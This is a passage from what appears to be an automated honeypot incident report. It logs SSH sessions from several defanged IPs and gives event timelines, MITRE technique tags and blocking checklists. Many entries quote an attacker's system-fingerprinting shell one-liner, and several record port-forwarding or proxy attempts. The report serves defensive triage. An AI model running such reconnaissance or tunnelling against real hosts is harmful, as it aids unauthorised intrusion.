| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:10:58` | `cowrie.session.connect` |
| `2026-08-25 05:10:58` | `cowrie.client.version` |
| `2026-08-25 05:10:58` | `cowrie.client.kex` |
| `2026-08-25 05:11:00` | `cowrie.login.success` |
| `2026-08-25 05:11:02` | `cowrie.session.params` |
| `2026-08-25 05:11:02` | `cowrie.command.input` |
| `2026-08-25 05:11:02` | `cowrie.command.input` |
| `2026-08-25 05:11:02` | `cowrie.command.input` |
| `2026-08-25 05:11:02` | `cowrie.command.input` |
| `2026-08-25 05:11:02` | `cowrie.command.input` |
| `2026-08-25 05:11:02` | `cowrie.command.success` |
| `2026-08-25 05:11:02` | `cowrie.command.input` |
| `2026-08-25 05:11:02` | `cowrie.command.input` |
| `2026-08-25 05:11:02` | `cowrie.command.input` |
| `2026-08-25 05:11:02` | `cowrie.command.input` |
| `2026-08-25 05:11:02` | `cowrie.log.closed` |
| `2026-08-25 05:11:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c8f54311ec9

| Field | Detail |
|---|---|
| **Source IP** | `34.77.179[.]139` |
| **First Seen** | 2026-08-25 05:11 |
| **Last Seen** | 2026-08-25 05:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:11:10` | `cowrie.session.connect` |
| `2026-08-25 05:11:10` | `cowrie.login.success` |
| `2026-08-25 05:11:10` | `cowrie.session.params` |
| `2026-08-25 05:11:10` | `cowrie.command.input` |
| `2026-08-25 05:11:10` | `cowrie.command.input` |
| `2026-08-25 05:11:10` | `cowrie.command.failed` |
| `2026-08-25 05:11:10` | `cowrie.command.input` |
| `2026-08-25 05:11:10` | `cowrie.log.closed` |
| `2026-08-25 05:11:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.179[.]139` to AbuseIPDB if not already reported
- [ ] Block `34.77.179[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c51d98a79236

| Field | Detail |
|---|---|
| **Source IP** | `34.77.179[.]139` |
| **First Seen** | 2026-08-25 05:11 |
| **Last Seen** | 2026-08-25 05:11 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:11:23` | `cowrie.session.connect` |
| `2026-08-25 05:11:23` | `cowrie.login.success` |
| `2026-08-25 05:11:24` | `cowrie.session.params` |
| `2026-08-25 05:11:24` | `cowrie.command.input` |
| `2026-08-25 05:11:24` | `cowrie.command.failed` |
| `2026-08-25 05:11:39` | `cowrie.log.closed` |
| `2026-08-25 05:11:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.179[.]139` to AbuseIPDB if not already reported
- [ ] Block `34.77.179[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04a1e8c9d3a2

| Field | Detail |
|---|---|
| **Source IP** | `34.77.179[.]139` |
| **First Seen** | 2026-08-25 05:11 |
| **Last Seen** | 2026-08-25 05:11 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:11:25` | `cowrie.session.connect` |
| `2026-08-25 05:11:25` | `cowrie.login.success` |
| `2026-08-25 05:11:26` | `cowrie.session.params` |
| `2026-08-25 05:11:26` | `cowrie.command.input` |
| `2026-08-25 05:11:39` | `cowrie.log.closed` |
| `2026-08-25 05:11:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.179[.]139` to AbuseIPDB if not already reported
- [ ] Block `34.77.179[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab4ab196e3b3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:13 |
| **Last Seen** | 2026-08-25 05:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:13:00` | `cowrie.session.connect` |
| `2026-08-25 05:13:03` | `cowrie.client.version` |
| `2026-08-25 05:13:03` | `cowrie.client.kex` |
| `2026-08-25 05:13:05` | `cowrie.login.success` |
| `2026-08-25 05:13:07` | `cowrie.session.params` |
| `2026-08-25 05:13:07` | `cowrie.command.input` |
| `2026-08-25 05:13:07` | `cowrie.command.input` |
| `2026-08-25 05:13:07` | `cowrie.command.input` |
| `2026-08-25 05:13:07` | `cowrie.command.input` |
| `2026-08-25 05:13:07` | `cowrie.command.input` |
| `2026-08-25 05:13:07` | `cowrie.command.success` |
| `2026-08-25 05:13:07` | `cowrie.command.input` |
| `2026-08-25 05:13:07` | `cowrie.command.input` |
| `2026-08-25 05:13:07` | `cowrie.command.input` |
| `2026-08-25 05:13:07` | `cowrie.command.input` |
| `2026-08-25 05:13:07` | `cowrie.log.closed` |
| `2026-08-25 05:13:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e3be710dd06

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:15 |
| **Last Seen** | 2026-08-25 05:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:15:01` | `cowrie.session.connect` |
| `2026-08-25 05:15:01` | `cowrie.client.version` |
| `2026-08-25 05:15:01` | `cowrie.client.kex` |
| `2026-08-25 05:15:04` | `cowrie.login.success` |
| `2026-08-25 05:15:06` | `cowrie.session.params` |
| `2026-08-25 05:15:06` | `cowrie.command.input` |
| `2026-08-25 05:15:06` | `cowrie.command.input` |
| `2026-08-25 05:15:06` | `cowrie.command.input` |
| `2026-08-25 05:15:06` | `cowrie.command.input` |
| `2026-08-25 05:15:06` | `cowrie.command.input` |
| `2026-08-25 05:15:06` | `cowrie.command.success` |
| `2026-08-25 05:15:06` | `cowrie.command.input` |
| `2026-08-25 05:15:06` | `cowrie.command.input` |
| `2026-08-25 05:15:06` | `cowrie.command.input` |
| `2026-08-25 05:15:06` | `cowrie.command.input` |
| `2026-08-25 05:15:07` | `cowrie.log.closed` |
| `2026-08-25 05:15:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfcdd2787191

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 05:16 |
| **Last Seen** | 2026-08-25 05:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:16:24` | `cowrie.session.connect` |
| `2026-08-25 05:16:24` | `cowrie.client.version` |
| `2026-08-25 05:16:25` | `cowrie.client.kex` |
| `2026-08-25 05:16:26` | `cowrie.login.success` |
| `2026-08-25 05:16:26` | `cowrie.direct-tcpip.request` |
| `2026-08-25 05:16:26` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 05:16:26` | `cowrie.direct-tcpip.data` |
| `2026-08-25 05:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e6da687bbf7

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 05:16 |
| **Last Seen** | 2026-08-25 05:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:16:28` | `cowrie.session.connect` |
| `2026-08-25 05:16:28` | `cowrie.client.version` |
| `2026-08-25 05:16:29` | `cowrie.client.kex` |
| `2026-08-25 05:16:29` | `cowrie.login.success` |
| `2026-08-25 05:16:30` | `cowrie.direct-tcpip.request` |
| `2026-08-25 05:16:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 05:16:30` | `cowrie.direct-tcpip.data` |
| `2026-08-25 05:16:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14b7071eea95

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:17 |
| **Last Seen** | 2026-08-25 05:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:17:05` | `cowrie.session.connect` |
| `2026-08-25 05:17:05` | `cowrie.client.version` |
| `2026-08-25 05:17:05` | `cowrie.client.kex` |
| `2026-08-25 05:17:07` | `cowrie.login.success` |
| `2026-08-25 05:17:09` | `cowrie.session.params` |
| `2026-08-25 05:17:09` | `cowrie.command.input` |
| `2026-08-25 05:17:09` | `cowrie.command.input` |
| `2026-08-25 05:17:09` | `cowrie.command.input` |
| `2026-08-25 05:17:09` | `cowrie.command.input` |
| `2026-08-25 05:17:09` | `cowrie.command.input` |
| `2026-08-25 05:17:09` | `cowrie.command.success` |
| `2026-08-25 05:17:09` | `cowrie.command.input` |
| `2026-08-25 05:17:09` | `cowrie.command.input` |
| `2026-08-25 05:17:09` | `cowrie.command.input` |
| `2026-08-25 05:17:09` | `cowrie.command.input` |
| `2026-08-25 05:17:10` | `cowrie.log.closed` |
| `2026-08-25 05:17:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff00b3ee7f8b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-25 05:18 |
| **Last Seen** | 2026-08-25 05:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:18:34` | `cowrie.session.connect` |
| `2026-08-25 05:18:34` | `cowrie.client.version` |
| `2026-08-25 05:18:34` | `cowrie.client.kex` |
| `2026-08-25 05:18:35` | `cowrie.login.success` |
| `2026-08-25 05:18:35` | `cowrie.direct-tcpip.request` |
| `2026-08-25 05:18:35` | `cowrie.direct-tcpip.data` |
| `2026-08-25 05:18:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a491962daeec

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:19 |
| **Last Seen** | 2026-08-25 05:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:19:08` | `cowrie.session.connect` |
| `2026-08-25 05:19:09` | `cowrie.client.version` |
| `2026-08-25 05:19:09` | `cowrie.client.kex` |
| `2026-08-25 05:19:10` | `cowrie.login.success` |
| `2026-08-25 05:19:12` | `cowrie.session.params` |
| `2026-08-25 05:19:12` | `cowrie.command.input` |
| `2026-08-25 05:19:12` | `cowrie.command.input` |
| `2026-08-25 05:19:12` | `cowrie.command.input` |
| `2026-08-25 05:19:12` | `cowrie.command.input` |
| `2026-08-25 05:19:12` | `cowrie.command.input` |
| `2026-08-25 05:19:12` | `cowrie.command.success` |
| `2026-08-25 05:19:12` | `cowrie.command.input` |
| `2026-08-25 05:19:12` | `cowrie.command.input` |
| `2026-08-25 05:19:12` | `cowrie.command.input` |
| `2026-08-25 05:19:12` | `cowrie.command.input` |
| `2026-08-25 05:19:12` | `cowrie.log.closed` |
| `2026-08-25 05:19:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32dd38f9de75

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:21 |
| **Last Seen** | 2026-08-25 05:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:21:17` | `cowrie.session.connect` |
| `2026-08-25 05:21:17` | `cowrie.client.version` |
| `2026-08-25 05:21:17` | `cowrie.client.kex` |
| `2026-08-25 05:21:19` | `cowrie.login.success` |
| `2026-08-25 05:21:20` | `cowrie.session.params` |
| `2026-08-25 05:21:20` | `cowrie.command.input` |
| `2026-08-25 05:21:20` | `cowrie.command.input` |
| `2026-08-25 05:21:20` | `cowrie.command.input` |
| `2026-08-25 05:21:20` | `cowrie.command.input` |
| `2026-08-25 05:21:20` | `cowrie.command.input` |
| `2026-08-25 05:21:20` | `cowrie.command.success` |
| `2026-08-25 05:21:20` | `cowrie.command.input` |
| `2026-08-25 05:21:21` | `cowrie.command.input` |
| `2026-08-25 05:21:21` | `cowrie.command.input` |
| `2026-08-25 05:21:21` | `cowrie.command.input` |
| `2026-08-25 05:21:22` | `cowrie.log.closed` |
| `2026-08-25 05:21:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7527f5b888cc

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:23 |
| **Last Seen** | 2026-08-25 05:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:23:26` | `cowrie.session.connect` |
| `2026-08-25 05:23:26` | `cowrie.client.version` |
| `2026-08-25 05:23:26` | `cowrie.client.kex` |
| `2026-08-25 05:23:28` | `cowrie.login.success` |
| `2026-08-25 05:23:30` | `cowrie.session.params` |
| `2026-08-25 05:23:30` | `cowrie.command.input` |
| `2026-08-25 05:23:30` | `cowrie.command.input` |
| `2026-08-25 05:23:30` | `cowrie.command.input` |
| `2026-08-25 05:23:30` | `cowrie.command.input` |
| `2026-08-25 05:23:30` | `cowrie.command.input` |
| `2026-08-25 05:23:30` | `cowrie.command.success` |
| `2026-08-25 05:23:30` | `cowrie.command.input` |
| `2026-08-25 05:23:30` | `cowrie.command.input` |
| `2026-08-25 05:23:30` | `cowrie.command.input` |
| `2026-08-25 05:23:30` | `cowrie.command.input` |
| `2026-08-25 05:23:30` | `cowrie.log.closed` |
| `2026-08-25 05:23:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49047814e975

| Field | Detail |
|---|---|
| **Source IP** | `172.239.64[.]155` |
| **First Seen** | 2026-08-25 05:23 |
| **Last Seen** | 2026-08-25 05:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:23:26` | `cowrie.session.connect` |
| `2026-08-25 05:23:26` | `cowrie.login.success` |
| `2026-08-25 05:23:27` | `cowrie.session.params` |
| `2026-08-25 05:23:27` | `cowrie.command.input` |
| `2026-08-25 05:23:27` | `cowrie.command.input` |
| `2026-08-25 05:23:27` | `cowrie.command.failed` |
| `2026-08-25 05:23:27` | `cowrie.command.input` |
| `2026-08-25 05:23:27` | `cowrie.command.failed` |
| `2026-08-25 05:23:27` | `cowrie.command.input` |
| `2026-08-25 05:23:27` | `cowrie.log.closed` |
| `2026-08-25 05:23:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.239.64[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.239.64[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdad26c27061

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:25 |
| **Last Seen** | 2026-08-25 05:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:25:38` | `cowrie.session.connect` |
| `2026-08-25 05:25:39` | `cowrie.client.version` |
| `2026-08-25 05:25:39` | `cowrie.client.kex` |
| `2026-08-25 05:25:40` | `cowrie.login.success` |
| `2026-08-25 05:25:41` | `cowrie.session.params` |
| `2026-08-25 05:25:41` | `cowrie.command.input` |
| `2026-08-25 05:25:41` | `cowrie.command.input` |
| `2026-08-25 05:25:41` | `cowrie.command.input` |
| `2026-08-25 05:25:41` | `cowrie.command.input` |
| `2026-08-25 05:25:41` | `cowrie.command.input` |
| `2026-08-25 05:25:41` | `cowrie.command.success` |
| `2026-08-25 05:25:41` | `cowrie.command.input` |
| `2026-08-25 05:25:41` | `cowrie.command.input` |
| `2026-08-25 05:25:41` | `cowrie.command.input` |
| `2026-08-25 05:25:41` | `cowrie.command.input` |
| `2026-08-25 05:25:42` | `cowrie.log.closed` |
| `2026-08-25 05:25:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02fbc8825702

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 05:25 |
| **Last Seen** | 2026-08-25 05:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:25:55` | `cowrie.session.connect` |
| `2026-08-25 05:25:55` | `cowrie.client.version` |
| `2026-08-25 05:25:55` | `cowrie.client.kex` |
| `2026-08-25 05:25:56` | `cowrie.login.success` |
| `2026-08-25 05:25:56` | `cowrie.direct-tcpip.request` |
| `2026-08-25 05:25:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 05:25:56` | `cowrie.direct-tcpip.data` |
| `2026-08-25 05:25:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a0265efc304

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 05:25 |
| **Last Seen** | 2026-08-25 05:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:25:59` | `cowrie.session.connect` |
| `2026-08-25 05:25:59` | `cowrie.client.version` |
| `2026-08-25 05:25:59` | `cowrie.client.kex` |
| `2026-08-25 05:26:00` | `cowrie.login.success` |
| `2026-08-25 05:26:00` | `cowrie.direct-tcpip.request` |
| `2026-08-25 05:26:01` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 05:26:01` | `cowrie.direct-tcpip.data` |
| `2026-08-25 05:26:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
